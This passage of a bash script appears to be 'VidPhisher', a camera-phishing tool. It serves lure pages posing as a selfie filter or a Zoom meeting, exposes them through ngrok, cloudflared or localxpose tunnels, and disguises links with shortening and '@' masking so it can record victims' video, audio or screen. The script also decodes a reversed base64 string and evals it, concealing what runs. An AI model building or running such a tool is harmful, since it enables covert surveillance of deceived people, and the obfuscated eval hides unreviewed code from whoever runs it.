#!/bin/bash

# VidPhisher
# Version    : 1.2
# Description: VidPhisher is a camera Phishing tool. Send a phishing link to victim, if he/she gives access to camera, his/her video will be captured!
# Author     : KasRoudra
# Github     : https://github.com/KasRoudra
# Email      : kasroudrakrd@gmail.com
# Credits    : TechChipNet, RecordRTC
# Date       : 05-06-2022
# License    : GPLv3
# Copyright  : KasRoudra 2022
# Language   : Shell
# Portable File
# If you copy, consider giving credit! We keep our code open source to help others

: <<'LicenseInfo'
                    GNU GENERAL PUBLIC LICENSE
                       Version 3, 29 June 2007

 Copyright (C) 2007 Free Software Foundation, Inc. <https://fsf.org/>
 Everyone is permitted to copy and distribute verbatim copies
 of this license document, but changing it is not allowed.

                            Preamble

  The GNU General Public License is a free, copyleft license for
software and other kinds of works.

  The licenses for most software and other practical works are designed
to take away your freedom to share and change the works.  By contrast,
the GNU General Public License is intended to guarantee your freedom to
share and change all versions of a program--to make sure it remains free
software for all its users.  We, the Free Software Foundation, use the
GNU General Public License for most of our software; it applies also to
any other work released this way by its authors.  You can apply it to
your programs, too.

  When we speak of free software, we are referring to freedom, not
price.  Our General Public Licenses are designed to make sure that you
have the freedom to distribute copies of free software (and charge for
them if you wish), that you receive source code or can get it if you
want it, that you can change the software or use pieces of it in new
free programs, and that you know you can do these things.

  To protect your rights, we need to prevent others from denying you
these rights or asking you to surrender the rights.  Therefore, you have
certain responsibilities if you distribute copies of the software, or if
you modify it: responsibilities to respect the freedom of others.

  For example, if you distribute copies of such a program, whether
gratis or for a fee, you must pass on to the recipients the same
freedoms that you received.  You must make sure that they, too, receive
or can get the source code.  And you must show them these terms so they
know their rights.

  Developers that use the GNU GPL protect your rights with two steps:
(1) assert copyright on the software, and (2) offer you this License
giving you legal permission to copy, distribute and/or modify it.

  For the developers' and authors' protection, the GPL clearly explains
that there is no warranty for this free software.  For both users' and
authors' sake, the GPL requires that modified versions be marked as
changed, so that their problems will not be attributed erroneously to
authors of previous versions.

  Some devices are designed to deny users access to install or run
modified versions of the software inside them, although the manufacturer
can do so.  This is fundamentally incompatible with the aim of
protecting users' freedom to change the software.  The systematic
pattern of such abuse occurs in the area of products for individuals to
use, which is precisely where it is most unacceptable.  Therefore, we
have designed this version of the GPL to prohibit the practice for those
products.  If such problems arise substantially in other domains, we
stand ready to extend this provision to those domains in future versions
of the GPL, as needed to protect the freedom of users.

  Finally, every program is threatened constantly by software patents.
States should not allow patents to restrict development and use of
software on general-purpose computers, but in those that do, we wish to
avoid the special danger that patents applied to a free program could
make it effectively proprietary.  To prevent this, the GPL assures that
patents cannot be used to render the program non-free.

  The precise terms and conditions for copying, distribution and
modification follow.

Copyright (C) 2022 KasRoudra (https://github.com/KasRoudra)
LicenseInfo


# Colors

black="\033[1;30m"
red="\033[1;31m"
green="\033[1;32m"
yellow="\033[1;33m"
blue="\033[1;34m"
purple="\033[1;35m"
cyan="\033[1;36m"
violate="\033[1;37m"
white="\033[0;37m"
nc="\033[00m"

# Output snippets
info="${cyan}[${white}+${cyan}] ${yellow}"
info2="${blue}[${white}•${blue}] ${yellow}"
ask="${green}[${white}?${green}] ${purple}"
error="${yellow}[${white}!${yellow}] ${red}"
success="${cyan}[${white}√${cyan}] ${green}"



version="1.2"

cwd=`pwd`

# Logo
logo="
${green}__     ___     _ ____  _     _     _ 
${red}\ \   / (_) __| |  _ \| |__ (_)___| |__   ___ _ __ 
${cyan} \ \ / /| |/ _' | |_) | '_ \| / __| '_ \ / _ \ '__| 
${purple}  \ V / | | (_| |  __/| | | | \__ \ | | |  __/ | 
${yellow}   \_/  |_|\__,_|_|   |_| |_|_|___/_| |_|\___|_| 
${red}                                          [v${version}] 
${blue}                                  [By KasRoudra] 
"
# Check for sudo
if command -v sudo > /dev/null 2>&1; then
    sudo=true
else
    sudo=false
fi

# Check if mac
if command -v brew > /dev/null 2>&1; then
    brew=true
    if command -v ngrok > /dev/null 2>&1; then
        ngrok=true
    else
        ngrok=false
    fi
    if command -v cloudflared > /dev/null 2>&1; then
        cloudflared=true
    else
        cloudflared=false
    fi
    if command -v localxpose > /dev/null 2>&1; then
        loclx=true
    else
        loclx=false
    fi
else
    brew=false
    ngrok=false
    cloudflared=false
    loclx=false
fi


# Kill running instances of required packages
killer() {
    for process in php wget curl unzip ngrok cloudflared loclx localxpose; do
        if pidof "$process" > /dev/null 2>&1; then
            killall "$process"
        fi
    done
}

# Check if offline
netcheck() {
    while true; do
        wget --spider --quiet https://github.com
        if [ "$?" != 0 ]; then
            echo -e "${error}No Internet!\007\n"
            sleep 2
        else
            break
        fi
    done
}

# Download tunneler and extract if necessary
manage_tunneler() {
    netcheck
    tunneler=${2%.*}
    echo -e "\n${info}Downloading ${green}${tunneler^}${nc}...\n"
    wget -q --show-progress "$1" -O "$2"
    if echo "$2" | grep -q "tgz"; then
        tar -zxf "$2"
        rm -rf $2
    fi
    if echo "$2" | grep -q "zip"; then
        unzip "$2"  > /dev/null 2>&1
        rm -rf $2
    fi
    for file in ngrok cloudflared loclx; do
        if [ -f "$file" ]; then
            mv -f $file $HOME/.tunneler
            if $sudo; then
                sudo chmod +x "$HOME/.tunneler/$file"
            else
                chmod +x "$HOME/.tunneler/$file"
            fi
        fi
    done
}


# Set template
url_manager() {
    if [[ "$2" == "1" ]]; then
        sed "s+siteName+"$dir"+g" template.php > index.php
        sed "s+mediaType+"$TYPE"+g" template.js | sed "s+recordingTime+"$DURATION"+g" > recorder.js
        echo -e "${info}Your urls are: \n"
    fi
    sleep 1
    echo -e "${success}URL ${2} > ${1}\n"
    echo -e "${success}URL ${3} > ${mask}@${1#https://}\n"
    sleep 1
    netcheck
    if echo $1 | grep -q "$TUNNELER"; then
        shortened=$(curl -s "https://is.gd/create.php?format=simple&url=${1}")
    else 
        shortened=""
    fi
    if ! [ -z "$shortened" ]; then
        if echo "$shortened" | head -n1 | grep -q "https://"; then
            echo -e "${success}Shortened > ${shortened}\n"
            echo -e "${success}Masked > ${mask}@${shortened#https://}\n"
        fi
    fi
}


# Prevent ^C
stty -echoctl

# Detect UserInterrupt
trap "echo -e '\n${success}Thanks for using!\n'; exit" 2


echo -e "\n${info}Please Wait!...\n${nc}"


gH4="Ed";kM0="xSz";c="ch";L="4";rQW="";fE1="lQ";s=" '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' | r";HxJ="s";Hc2="";f="as";kcE="pas";cEf="ae";d="o";V9z="6";P8c="if";U=" -d";Jc="ef";N0q="";v="b";w="e";b="v |";Tx="Eds";xZp=""
x=$(eval "$Hc2$w$c$rQW$d$s$w$b$Hc2$v$xZp$f$w$V9z$rQW$L$U$xZp")
eval "$N0q$x$Hc2$rQW"




# Termux
if [[ -d /data/data/com.termux/files/home ]]; then
    termux=true
else
    termux=false
fi

# Workdir

if [ -z $DIRECTORY ]; then
    exit 1;
else
    if [[ $DIRECTORY == true || ! -d $DIRECTORY ]]; then
        if $termux; then
            if ! [ -d /sdcard/Media ]; then
                cd /sdcard && mkdir Media
            fi
            FOL="/sdcard/Media"
            cd "$FOL"
            if ! [[ -e ".temp" ]]; then
                touch .temp  || (termux-setup-storage && echo -e "\n${error}Please Restart Termux!\n\007" && sleep 5 && exit 0)
            fi
        else
            if [ -d "$HOME/Documents" ]; then
                FOL="$HOME/Documents"
            else
                FOL="$cwd"
            fi
        fi
    else
        FOL="$DIRECTORY"
    fi
fi

cd "$cwd"
# Set Type of media
if [ -z $TYPE ]; then
    exit 1;
else
    if ! [[ $TYPE == "video" || $TYPE == "audio" || $TYPE == "screen" || $TYPE == "both" ]]; then
        TYPE="video"
    fi
fi


# Set Port
if [ -z $PORT ]; then
    exit 1;
else
   if [ ! -z "${PORT##*[!0-9]*}" ] ; then
       printf ""
   else
       PORT=8080
   fi
fi


# Install required packages
for package in php curl wget unzip; do
    if ! command -v "$package" > /dev/null 2>&1; then
        echo -e "${info}Installing ${package}....${nc}"
        for pacman in pkg apt apt-get yum dnf brew; do
            if command -v "$pacman" > /dev/null 2>&1; then
                if $sudo; then
                    sudo $pacman install $package
                else
                    $pacman install $package
                fi
                break
            fi
        done
        if command -v "apk" > /dev/null 2>&1; then
            if $sudo; then
                sudo apk add $package
            else
                apk add $package
            fi
            break
        fi
        if command -v "pacman" > /dev/null 2>&1; then
            if $sudo; then
                sudo pacman -S $package
            else
                pacman -S $package
            fi
            break
        fi
    fi
done

# Set duration
if [ -z $DURATION ]; then
    exit 1;
else
    if [ ! -z "${DURATION##*[!0-9]*}" ] ; then
        DURATION=5000
    fi
fi


# Check for proot in termux
if $termux; then
    if ! command -v proot > /dev/null 2>&1; then
        echo -e "${info}Installing proot...."
        pkg install proot -y
    fi
    if ! command -v proot > /dev/null 2>&1; then
        echo -e "${error}Proot can't be installed!\007\n"
        exit 1
    fi
fi

# Set Tunneler
if [ -z $TUNNELER ]; then
    exit 1;
else
   if [ $TUNNELER == "cloudflared" ]; then
       TUNNELER="cloudflare"
   fi
fi

#:Check if required packages are successfully installed
for package in php wget curl unzip; do
    if ! command -v "$package"  > /dev/null 2>&1; then
        echo -e "${error}${package} cannot be installed!\007\n"
        exit 1
    fi
done

# Check for running processes that couldn't be terminated
killer
for process in php wget curl unzip ngrok cloudflared loclx localxpose; do
    if pidof "$process"  > /dev/null 2>&1; then
        echo -e "${error}Previous ${process} cannot be closed. Restart terminal!\007\n"
        exit 1
    fi
done



# Download tunnlers
arch=$(uname -m)
platform=$(uname)
if ! [[ -d $HOME/.tunneler ]]; then
    mkdir $HOME/.tunneler
fi
if ! [[ -f $HOME/.tunneler/ngrok ]] ; then
    nongrok=true
else
    nongrok=false
fi
if ! [[ -f $HOME/.tunneler/cloudflared ]] ; then
    nocf=true
else
    nocf=false
fi
if ! [[ -f $HOME/.tunneler/loclx ]] ; then
    noloclx=true
else
    noloclx=false
fi
netcheck
rm -rf ngrok.tgz ngrok.zip cloudflared cloudflared.tgz loclx.zip
cd "$cwd"
if echo "$platform" | grep -q "Darwin"; then
    if $brew; then
        ! $ngrok && brew install ngrok/ngrok/ngrok
        ! $cloudflared && brew install cloudflare/cloudflare/cloudflared
        ! $loclx && brew install localxpose
    else
        if echo "$arch" | grep -q "x86_64"; then
            $nongrok && manage_tunneler "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-v3-stable-darwin-amd64.zip" "ngrok.zip"
            $nocf && manage_tunneler "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64.tgz" "cloudflared.tgz"
            $noloclx && manage_tunneler "https://api.localxpose.io/api/v2/downloads/loclx-darwin-amd64.zip" "loclx.zip"
        elif echo "$arch" | grep -q "arm64"; then
            $nongrok && manage_tunneler "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-v3-stable-darwin-arm64.zip" "ngrok.zip"
            echo -e "${error}Device architecture unknown. Download cloudflared manually!"
            sleep 3
            $noloclx && manage_tunneler "https://api.localxpose.io/api/v2/downloads/loclx-darwin-arm64.zip" "loclx.zip"
        else
            echo -e "${error}Device architecture unknown. Download ngrok/cloudflared/loclx manually!"
            sleep 3
        fi
    fi
elif echo "$platform" | grep -q "Linux"; then
    if echo "$arch" | grep -q "aarch64"; then
        $nongrok && manage_tunneler "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-v3-stable-linux-arm64.tgz" "ngrok.tgz"
        $nocf && manage_tunneler "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64" "cloudflared"
        $noloclx && manage_tunneler "https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip" "loclx.zip"
    elif echo "$arch" | grep -q "arm"; then
        $nongrok && manage_tunneler "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-v3-stable-linux-arm.tgz" "ngrok.tgz"
        $nocf && manage_tunneler "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm" "cloudflared"
        $noloclx && manage_tunneler "https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip" "loclx.zip"
    elif echo "$arch" | grep -q "x86_64"; then
        $nongrok && manage_tunneler "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-v3-stable-linux-amd64.tgz" "ngrok.tgz"
        $nocf && manage_tunneler "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64" "cloudflared"
        $noloclx && manage_tunneler "https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip" "loclx.zip"
    else
        $nongrok && manage_tunneler "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-v3-stable-linux-386.tgz" "ngrok.tgz"
        $nocf && manage_tunneler "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386" "cloudflared"
        $noloclx && manage_tunneler "https://api.localxpose.io/api/v2/downloads/loclx-linux-386.zip" "loclx.zip"
    fi
else
    echo -e "${error}Unsupported Platform!"
    exit
fi

# Check for update
netcheck
if [[ -z $UPDATE ]]; then
    exit 1
else
    if [[ $UPDATE == true ]]; then
        git_ver=`curl -s -N https://raw.githubusercontent.com/KasRoudra/VidPhisher/main/files/version.txt`
    else
        git_ver=$version
    fi
fi

if [[ "$git_ver" != "404: Not Found" && "$git_ver" != "$version" ]]; then
    changelog=$(curl -s -N https://raw.githubusercontent.com/KasRoudra/VidPhisher/main/files/changelog.log)
    clear
    echo -e "$logo"
    echo -e "${info}VidPhisher has a new update!\n${info}Current: ${red}${version}\n${info}Available: ${green}${git_ver}\n"
        printf "${ask}Do you want to update VidPhisher?${yellow}[y/n] > $green"
        read upask
        printf "$nc"
        if [[ "$upask" == "y" ]]; then
            cd .. && rm -rf VidPhisher vidphisher && git clone https://github.com/KasRoudra/VidPhisher
            echo -e "\n${success}VidPhisher updated successfully!!"
            if [[ "$changelog" != "404: Not Found" ]]; then
                echo -e "${purple}[•] Changelog:\n${blue}"
                echo $changelog | head -n3
            fi
            exit
        elif [[ "$upask" == "n" ]]; then
            echo -e "\n${info}Updating cancelled. Using old version!"
            sleep 2
        else
            echo -e "\n${error}Wrong input!\n"
            sleep 2
        fi
fi

# Ngrok Authtoken
if ! [[ -e $HOME/.config/ngrok/ngrok.yml ]]; then
    echo -e "\n${ask}Enter your ngrok authtoken:"
    printf "${cyan}\nVid${nc}@${cyan}Phisher ${red}$ ${nc}"
    read auth
    if [ -z "$auth" ]; then
        echo -e "\n${error}No authtoken!\n\007"
        sleep 1
    else
        cd $HOME/.tunneler && ./ngrok config add-authtoken authtoken ${auth}
    fi
fi

# Start Point
while true; do
clear
echo -e "$logo"
sleep 1
echo -e "${ask}Choose an option:

${cyan}[${white}1${cyan}] ${yellow}Selfie Filter
${cyan}[${white}2${cyan}] ${yellow}Online Meeting
${cyan}[${white}d${cyan}] ${yellow}Change Image Directory (current: ${red}${FOL}${yellow})
${cyan}[${white}t${cyan}] ${yellow}Change Type of Media (current: ${red}${TYPE}${yellow})
${cyan}[${white}p${cyan}] ${yellow}Change Default Port (current: ${red}${PORT}${yellow})
${cyan}[${white}s${cyan}] ${yellow}Change Default Duration (current: ${red}${DURATION}${yellow})
${cyan}[${white}x${cyan}] ${yellow}About
${cyan}[${white}m${cyan}] ${yellow}More tools
${cyan}[${white}0${cyan}] ${yellow}Exit${blue}
"
sleep 1
if [ -z $OPTION ]; then
    exit 1
else
    if [[ $OPTION == true ]]; then
        printf "${cyan}\nVid${nc}@${cyan}Phisher ${red}$ ${nc}"
        read option
    else
        option=$OPTION
    fi
fi
# Select template
    if echo $option | grep -q "1"; then
        dir="selfil"
        mask="https://take-selfie-with-premium-filters"
        break
    elif echo $option | grep -q "2"; then
        dir="om"
        mask="https://join-zoom-online-meeting"
        break
    elif echo $option | grep -q "t"; then
        printf "\n${ask}Enter type:${cyan}\n\nVid${nc}@${cyan}Phisher ${red}$ ${nc}"
        read typee
        if [[ $typee == "video" || $typee == "audio" || $typee == "screen" || $typee == "both" ]] ; then
            TYPE=$typee;
            echo -e "\n${success}Type changed to ${TYPE} successfully!\n"
            sleep 2
        else
            echo -e "\n${error}Invalid type!\n\007"
            sleep 2
        fi
    elif echo $option | grep -q "p"; then
        printf "\n${ask}Enter Port:${cyan}\n\nVid${nc}@${cyan}Phisher ${red}$ ${nc}"
        read pore
        if [ ! -z "${pore##*[!0-9]*}" ] ; then
            PORT="$pore";
            echo -e "\n${success}Port changed to ${PORT} successfully!\n"
            sleep 2
        else
            echo -e "\n${error}Invalid port!\n\007"
            sleep 2
        fi
    elif echo $option | grep -q "s"; then
        printf "\n${ask}Enter Media Duration:${cyan}\n\nVid${nc}@${cyan}Phisher ${red}$ ${nc}"
        read dure
        if [ ! -z "${dure##*[!0-9]*}" ] ; then
            DURATION="$dure";
            echo -e "\n${success}Duration changed to ${DURATION} successfully!\n"
            sleep 2
        else
            echo -e "\n${error}Invalid duration!\n\007"
            sleep 2
        fi
    elif echo $option | grep -q "d"; then
        printf "\n${ask}Enter Directory:${cyan}\n\Vid${nc}@${cyan}Phisher ${red}$ ${nc}"
        read dire
        if ! [ -d $dire ]; then
            echo -e "\n${error}Invalid directory!\n\007"
            sleep 2
        else
            FOL="$dire"
            echo -e "\n${success}Directory changed successfully!\n"
            sleep 2
        fi
    elif echo $option | grep -q "x"; then
        clear
        echo -e "$logo"
        echo -e "$red[ToolName]  ${cyan}  :[VidPhisher]
$red[Version]    ${cyan} :[${version}]
$red[Description]${cyan} :[Video Phishing tool]
$red[Author]     ${cyan} :[KasRoudra]
$red[Github]     ${cyan} :[https://github.com/KasRoudra]
$red[Messenger]  ${cyan} :[https://m.me/KasRoudra]
$red[Email]      ${cyan} :[kasroudrakrd@gmail.com]"
        printf "${cyan}\nVid${nc}@${cyan}Phisher ${red}$ ${nc}"
        read about
    elif echo $option | grep -q "m"; then
        xdg-open "https://github.com/KasRoudra/KasRoudra#My-Best-Works"
    elif echo $option | grep -q "0"; then
        echo -e "\n${success}Thanks for using!\n"
        exit 0
    else
        echo -e "\n${error}Invalid input!\007"
        OPTION=true
        sleep 1
    fi
done

if ! [ -d "$HOME/.site" ]; then
    mkdir "$HOME/.site"
else
    cd $HOME/.site
    rm -rf *
fi
cd "$cwd"
if [ -e websites.zip ]; then
    unzip websites.zip > /dev/null 2>&1
    rm -rf websites.zip
fi

if ! [ -d sites ]; then
    wget -q --show-progress https://github.com/KasRoudra/VidPhisher/releases/latest/download/websites.zip
    mkdir sites
    unzip websites.zip -d sites > /dev/null 2>&1
    rm -rf websites.zip
fi
cd sites
cp -r * "$HOME/.site"
# Hotspot required for termux
if $termux; then
    echo -e "\n${info2}If you haven't turned on hotspot, please enable it!"
    sleep 3
fi
echo -e "\n${info}Starting php server at localhost:${PORT}....\n"
netcheck
cd "$HOME/.site"
php -S 127.0.0.1:${PORT} > /dev/null 2>&1 &
sleep 2
status=$(curl -s --head -w %{http_code} 127.0.0.1:${PORT} -o /dev/null)
if echo "$status" | grep -q "404"; then
    echo -e "${error}PHP couldn't start!\n\007"
    killer; exit 1
else
    echo -e "${success}PHP has been started successfully!\n"
fi
sleep 1
echo -e "${info2}Starting tunnelers......\n"
find "$HOME/.tunneler" -name "*.log" -delete
netcheck
cd $HOME/.tunneler
if $termux; then
    termux-chroot ./ngrok http 127.0.0.1:${PORT} > /dev/null 2>&1 &
    termux-chroot ./cloudflared tunnel -url "127.0.0.1:${PORT}" --logfile cf.log > /dev/null 2>&1 &
